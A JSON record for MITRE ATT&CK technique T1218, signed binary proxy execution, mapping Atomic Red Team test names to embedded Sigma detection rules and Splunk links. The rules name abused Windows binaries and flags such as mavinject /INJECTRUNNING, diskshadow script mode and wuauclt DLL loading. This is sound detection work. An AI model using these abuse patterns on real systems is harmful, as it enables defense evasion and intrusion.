{
    "id": "T1218",
    "name": "Signed Binary Proxy Execution",
    "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation",
    "detection": "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.",
    "url": "https://attack.mitre.org/techniques/T1218",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "0e1483ba-8f0c-425d-b8c6-42736e058eaa",
                "atomic_attack_name": "DiskShadow Command Execution",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Diskshadow Script Mode Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_diskshadow_script_mode.yml",
                        "remote_content": "title: Diskshadow Script Mode Execution\nid: 0c2f8629-7129-4a8a-9897-7e0768f13ff2\nrelated:\n    - id: fa1a7e52-3d02-435b-81b8-00da14dd66c1 # Diskshadow Script Mode - Execution From Potential Suspicious Location\n      type: similar\n    - id: 1dde5376-a648-492e-9e54-4241dd9b0c7f # Diskshadow Script Mode - Uncommon Script Extension Execution\n      type: similar\n    - id: 9f546b25-5f12-4c8d-8532-5893dcb1e4b8 # Potentially Suspicious Child Process Of DiskShadow.EXE\n      type: similar\n    - id: 56b1dde8-b274-435f-a73a-fb75eb81262a # Diskshadow Child Process Spawned\n      type: similar\nstatus: test\ndescription: |\n    Detects execution of \"Diskshadow.exe\" in script mode using the \"/s\" flag. Attackers often abuse \"diskshadow\" to execute scripts that deleted the shadow copies on the systems. Investigate the content of the scripts and its location.\nreferences:\n    - https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n    - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration\n    - https://medium.com/@cyberjyot/lolbin-execution-via-diskshadow-f6ff681a27a4\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\nauthor: Ivan Dyachkov, oscd.community\ndate: 2020-10-07\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.execution\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'diskshadow.exe'\n        - Image|endswith: '\\diskshadow.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-s '\n    condition: all of selection_*\nfalsepositives:\n    - Likely from legitimate backup scripts\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows Diskshadow Proxy Execution",
                        "rule_link": "https://research.splunk.com/endpoint/58adae9e-8ea3-11ec-90f6-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "4cc40fd7-87b8-4b16-b2d7-57534b86b911",
                "atomic_attack_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Process Masquerading As SvcHost.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_svchost_masqueraded_execution.yml",
                        "remote_content": "title: Suspicious Process Masquerading As SvcHost.EXE\nid: be58d2e2-06c8-4f58-b666-b99f6dc3b6cd\nrelated:\n    - id: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\n      type: similar\n    - id: e4a6b256-3e47-40fc-89d2-7a477edd6915\n      type: similar\nstatus: experimental\ndescription: |\n    Detects a suspicious process that is masquerading as the legitimate \"svchost.exe\" by naming its binary \"svchost.exe\" and executing from an uncommon location.\n    Adversaries often disguise their malicious binaries by naming them after legitimate system processes like \"svchost.exe\" to evade detection.\nreferences:\n    - https://tria.ge/240731-jh4crsycnb/behavioral2\n    - https://redcanary.com/blog/threat-detection/process-masquerading/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-08-07\ntags:\n    - attack.defense-evasion\n    - attack.t1036.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n    filter_main_img_location:\n        Image:\n            - 'C:\\Windows\\System32\\svchost.exe'\n            - 'C:\\Windows\\SysWOW64\\svchost.exe'\n    filter_main_ofn:\n        OriginalFileName: 'svchost.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "Uncommon Svchost Parent Process",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_svchost_uncommon_parent_process.yml",
                        "remote_content": "title: Uncommon Svchost Parent Process\nid: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\nstatus: test\ndescription: Detects an uncommon svchost parent process\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-08-15\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n    filter_main_generic:\n        ParentImage|endswith:\n            - '\\Mrt.exe'\n            - '\\MsMpEng.exe'\n            - '\\ngen.exe'\n            - '\\rpcnet.exe'\n            - '\\services.exe'\n            - '\\TiWorker.exe'\n    filter_main_parent_null:\n        ParentImage: null\n    filter_main_parent_empty:\n        ParentImage:\n            - '-'\n            - ''\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "System File Execution Location Anomaly",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_system_exe_anomaly.yml",
                        "remote_content": "title: System File Execution Location Anomaly\nid: e4a6b256-3e47-40fc-89d2-7a477edd6915\nrelated:\n    - id: be58d2e2-06c8-4f58-b666-b99f6dc3b6cd # Dedicated SvcHost rule\n      type: derived\nstatus: experimental\ndescription: |\n    Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.\nreferences:\n    - https://twitter.com/GelosSnake/status/934900723426439170\n    - https://asec.ahnlab.com/en/39828/\nauthor: Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2017-11-27\nmodified: 2024-07-16\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\atbroker.exe'\n            - '\\audiodg.exe'\n            - '\\bcdedit.exe'\n            - '\\bitsadmin.exe'\n            - '\\certreq.exe'\n            - '\\certutil.exe'\n            - '\\cmstp.exe'\n            - '\\conhost.exe'\n            - '\\consent.exe'\n            - '\\cscript.exe'\n            - '\\csrss.exe'\n            - '\\dashost.exe'\n            - '\\defrag.exe'\n            - '\\dfrgui.exe' # Was seen used by Lazarus Group - https://asec.ahnlab.com/en/39828/\n            - '\\dism.exe'\n            - '\\dllhost.exe'\n            - '\\dllhst3g.exe'\n            - '\\dwm.exe'\n            - '\\eventvwr.exe'\n            - '\\logonui.exe'\n            - '\\LsaIso.exe'\n            - '\\lsass.exe'\n            - '\\lsm.exe'\n            - '\\msiexec.exe'\n            - '\\ntoskrnl.exe'\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\runonce.exe'\n            - '\\RuntimeBroker.exe'\n            - '\\schtasks.exe'\n            - '\\services.exe'\n            - '\\sihost.exe'\n            - '\\smartscreen.exe'\n            - '\\smss.exe'\n            - '\\spoolsv.exe'\n            - '\\svchost.exe'\n            - '\\taskhost.exe'\n            - '\\Taskmgr.exe'\n            - '\\userinit.exe'\n            - '\\wininit.exe'\n            - '\\winlogon.exe'\n            - '\\winver.exe'\n            - '\\wlanext.exe'\n            - '\\wscript.exe'\n            - '\\wsl.exe'\n            - '\\wsmprovhost.exe' # Was seen used by Lazarus Group - https://asec.ahnlab.com/en/39828/\n    filter_main_generic:\n        Image|startswith:\n            - 'C:\\$WINDOWS.~BT\\'\n            - 'C:\\$WinREAgent\\'\n            - 'C:\\Windows\\SoftwareDistribution\\'\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SystemTemp\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\uus\\'\n            - 'C:\\Windows\\WinSxS\\'\n    filter_optional_system32:\n        Image|contains: '\\SystemRoot\\System32\\'\n    filter_main_powershell:\n        Image:\n            - 'C:\\Program Files\\PowerShell\\7\\pwsh.exe'\n            - 'C:\\Program Files\\PowerShell\\7-preview\\pwsh.exe'\n    filter_main_wsl_windowsapps:\n        Image|startswith: 'C:\\Program Files\\WindowsApps\\MicrosoftCorporationII.WindowsSubsystemForLinux'\n        Image|endswith: '\\wsl.exe'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "System Processes Run From Unexpected Locations",
                        "rule_link": "https://research.splunk.com/endpoint/a34aae96-ccf8-4aef-952c-3ea21444444d/"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "c426dacf-575d-4937-8611-a148a86a5e61",
                "atomic_attack_name": "mavinject - Inject DLL into running process",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Mavinject Inject DLL Into Running Process",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_mavinject_process_injection.yml",
                        "remote_content": "title: Mavinject Inject DLL Into Running Process\nid: 4f73421b-5a0b-4bbf-a892-5a7fb99bea66\nrelated:\n    - id: 17eb8e57-9983-420d-ad8a-2c4976c22eb8\n      type: obsolete\nstatus: test\ndescription: Detects process injection using the signed Windows tool \"Mavinject\" via the \"INJECTRUNNING\" flag\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md\n    - https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e\n    - https://twitter.com/gN3mes1s/status/941315826107510784\n    - https://reaqta.com/2017/12/mavinject-microsoft-injector/\n    - https://twitter.com/Hexacorn/status/776122138063409152  # Deleted tweet\n    - https://github.com/SigmaHQ/sigma/issues/3742\n    - https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection\nauthor: frack113, Florian Roth\ndate: 2021-07-12\nmodified: 2022-12-05\ntags:\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1055.001\n    - attack.t1218.013\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ' /INJECTRUNNING '\n    filter:\n        ParentImage: 'C:\\Windows\\System32\\AppVClient.exe' # This parent is the expected process to launch \"mavinject\"\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows Binary Proxy Execution Mavinject DLL Injection",
                        "rule_link": "https://research.splunk.com/endpoint/ccf4b61b-1b26-4f2e-a089-f2009c569c57/"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "7816c252-b728-4ea6-a683-bd9441ca0b71",
                "atomic_attack_name": "System Binary Proxy Execution - Wlrmdr Lolbin",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Wlrmdr.EXE Uncommon Argument Or Child Process",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wlrmdr_uncommon_child_process.yml",
                        "remote_content": "title: Wlrmdr.EXE Uncommon Argument Or Child Process\nid: 9cfc00b6-bfb7-49ce-9781-ef78503154bb\nstatus: test\ndescription: |\n    Detects the execution of \"Wlrmdr.exe\" with the \"-u\" command line flag which allows anything passed to it to be an argument of the ShellExecute API, which would allow an attacker to execute arbitrary binaries.\n    This detection also focuses on any uncommon child processes spawned from \"Wlrmdr.exe\" as a supplement for those that posses \"ParentImage\" telemetry.\nreferences:\n    - https://twitter.com/0gtweet/status/1493963591745220608?s=20&t=xUg9DsZhJy1q9bPTUWgeIQ\n    - https://lolbas-project.github.io/lolbas/Binaries/Wlrmdr/\nauthor: frack113, manasmbellani\ndate: 2022-02-16\nmodified: 2024-03-06\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent: # This selection is looking for processes spawned from wlrmdr using the \"-u\" flag\n        ParentImage|endswith: '\\wlrmdr.exe'\n    selection_child_img:\n        - Image|endswith: '\\wlrmdr.exe'\n        - OriginalFileName: 'WLRMNDR.EXE'\n    selection_child_cli:\n        CommandLine|contains|all|windash:\n            - '-s '\n            - '-f '\n            - '-t '\n            - '-m '\n            - '-a '\n            - '-u '\n    filter_main_winlogon:\n        ParentImage: 'C:\\Windows\\System32\\winlogon.exe'\n    filter_main_empty:\n        ParentImage:\n            - ''\n            - '-'\n    filter_main_null:\n        ParentImage: null\n    condition: selection_parent or (all of selection_child_* and not 1 of filter_main_*)\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "ab76e34f-28bf-441f-a39c-8db4835b89cc",
                "atomic_attack_name": "Provlaunch.exe Executes Arbitrary Command via Registry Key",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Provisioning Registry Key Abuse For Binary Proxy Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_registry_provlaunch_provisioning_command.yml",
                        "remote_content": "title: Potential Provisioning Registry Key Abuse For Binary Proxy Execution\nid: 2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25\nrelated:\n    - id: 7f5d1c9a-3e83-48df-95a7-2b98aae6c13c # CLI Generic\n      type: similar\n    - id: f9999590-1f94-4a34-a91e-951e47bedefd # CLI Abuse\n      type: similar\n    - id: 7021255e-5db3-4946-a8b9-0ba7a4644a69 # Registry\n      type: similar\nstatus: test\ndescription: Detects potential abuse of the provisioning registry key for indirect command execution through \"Provlaunch.exe\".\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\n    - https://twitter.com/0gtweet/status/1674399582162153472\nauthor: Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel\ndate: 2023-08-08\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'SOFTWARE\\Microsoft\\Provisioning\\Commands\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "13c0804e-615e-43ad-b223-2dfbacd0b0b3",
                "atomic_attack_name": "Lolbas ie4uinit.exe use as proxy",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Copy From or To System Directory",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "f8da74bb-21b8-4af9-8d84-f2c8e4a220e3",
                "atomic_attack_name": "Lolbin Gpscript startup option",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Gpscript Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml",
                        "remote_content": "title: Gpscript Execution\nid: 1e59c230-6670-45bf-83b0-98903780607e\nstatus: test\ndescription: Detects the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy\nreferences:\n    - https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n    - https://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nauthor: frack113\ndate: 2022-05-16\nmodified: 2023-06-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\gpscript.exe'\n        - OriginalFileName: 'GPSCRIPT.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ' /logon'\n            - ' /startup'\n    filter_main_svchost:\n        ParentCommandLine: 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate uses of logon scripts distributed via group policy\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "5bcda9cd-8e85-48fa-861d-b5a85d91d48c",
                "atomic_attack_name": "Lolbin Gpscript logon option",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Gpscript Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml",
                        "remote_content": "title: Gpscript Execution\nid: 1e59c230-6670-45bf-83b0-98903780607e\nstatus: test\ndescription: Detects the execution of the LOLBIN gpscript, which executes logon or startup scripts configured in Group Policy\nreferences:\n    - https://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n    - https://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nauthor: frack113\ndate: 2022-05-16\nmodified: 2023-06-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\gpscript.exe'\n        - OriginalFileName: 'GPSCRIPT.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ' /logon'\n            - ' /startup'\n    filter_main_svchost:\n        ParentCommandLine: 'C:\\windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate uses of logon scripts distributed via group policy\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "49fbd548-49e9-4bb7-94a6-3769613912b8",
                "atomic_attack_name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Proxy Execution Via Wuauclt.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wuauclt_dll_loading.yml",
                        "remote_content": "title: Proxy Execution Via Wuauclt.EXE\nid: af77cf95-c469-471c-b6a0-946c685c4798\nrelated:\n    - id: ba1bb0cb-73da-42de-ad3a-de10c643a5d0\n      type: obsolete\n    - id: d7825193-b70a-48a4-b992-8b5b3015cc11\n      type: obsolete\nstatus: test\ndescription: Detects the use of the Windows Update Client binary (wuauclt.exe) for proxy execution.\nreferences:\n    - https://dtm.uk/wuauclt/\n    - https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), Florian Roth (Nextron Systems), Sreeman, FPT.EagleEye Team\ndate: 2020-10-12\nmodified: 2023-11-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wuauclt.exe'\n        - OriginalFileName: 'wuauclt.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'UpdateDeploymentProvider'\n            - 'RunHandlerComServer'\n    filter_main_generic:\n        # Note: Please enhance this if you find the full path\n        CommandLine|contains: ' /UpdateDeploymentProvider UpdateDeploymentProvider.dll '\n    filter_main_wuaueng:\n        # Note: Please enhance this if you find the full path\n        CommandLine|contains: ' wuaueng.dll '\n    filter_main_uus:\n        CommandLine|contains:\n            - ':\\Windows\\UUS\\Packages\\Preview\\amd64\\updatedeploy.dll /ClassId'\n            - ':\\Windows\\UUS\\amd64\\UpdateDeploy.dll /ClassId'\n    filter_main_winsxs:\n        CommandLine|contains|all:\n            - ':\\Windows\\WinSxS\\'\n            - '\\UpdateDeploy.dll /ClassId '\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "9ebe7901-7edf-45c0-b5c7-8366300919db",
                "atomic_attack_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_remotefxvgpudisablement_abuse.yml",
                        "remote_content": "title: RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses\nid: a6fc3c46-23b8-4996-9ea2-573f4c4d88c5\nrelated:\n    - id: f65e22f9-819e-4f96-9c7b-498364ae7a25 # PS Classic\n      type: similar\n    - id: 38a7625e-b2cb-485d-b83d-aff137d859f4 # PS Module\n      type: similar\n    - id: cacef8fc-9d3d-41f7-956d-455c6e881bc5 # PS ScriptBlock\n      type: similar\nstatus: test\ndescription: Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://github.com/redcanaryco/AtomicTestHarnesses/blob/7e1e4da116801e3d6fcc6bedb207064577e40572/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\nauthor: frack113\ndate: 2021-07-13\nmodified: 2023-05-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-ATHRemoteFXvGPUDisablementCommand'\n            - 'Invoke-ATHRemoteFXvGPUDisableme'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "7cbb0f26-a4c1-4f77-b180-a009aa05637e",
                "atomic_attack_name": "Microsoft.Workflow.Compiler.exe Payload Execution",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Microsoft Workflow Compiler Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_microsoft_workflow_compiler_execution.yml",
                        "remote_content": "title: Microsoft Workflow Compiler Execution\nid: 419dbf2b-8a9b-4bea-bf99-7544b050ec8d\nstatus: test\ndescription: |\n    Detects the execution of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.\nreferences:\n    - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/\nauthor: Nik Seetharaman, frack113\ndate: 2019-01-16\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1127\n    - attack.t1218\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\Microsoft.Workflow.Compiler.exe'\n        - OriginalFileName: 'Microsoft.Workflow.Compiler.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate MWC use (unlikely in modern enterprise environments)\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "54ad7d5a-a1b5-472c-b6c4-f8090fb2daef",
                "atomic_attack_name": "InfDefaultInstall.exe .inf Execution",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "InfDefaultInstall.exe .inf Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_infdefaultinstall_execute_sct_scripts.yml",
                        "remote_content": "title: InfDefaultInstall.exe .inf Execution\nid: ce7cf472-6fcc-490a-9481-3786840b5d9b\nstatus: test\ndescription: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution\n    - https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/\nauthor: frack113\ndate: 2021-07-13\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'InfDefaultInstall.exe '\n            - '.inf'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1218",
                "atomic_attack_guid": "ad2c17ed-f626-4061-b21e-b9804a6f3655",
                "atomic_attack_name": "Register-CimProvider - Execute evil dll",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "DLL Execution Via Register-cimprovider.exe",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_registry_cimprovider_dll_load.yml",
                        "remote_content": "title: DLL Execution Via Register-cimprovider.exe\nid: a2910908-e86f-4687-aeba-76a5f996e652\nstatus: test\ndescription: Detects using register-cimprovider.exe to execute arbitrary dll file.\nreferences:\n    - https://twitter.com/PhilipTsukerman/status/992021361106268161\n    - https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/\nauthor: Ivan Dyachkov, Yulia Fomina, oscd.community\ndate: 2020-10-07\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1574\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\register-cimprovider.exe'\n        CommandLine|contains|all:\n            - '-path'\n            - 'dll'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "64760eef-87f7-4ed3-93fd-655668ea9420",
                    "02b18447-ea83-4b1b-8805-714a8a34546a",
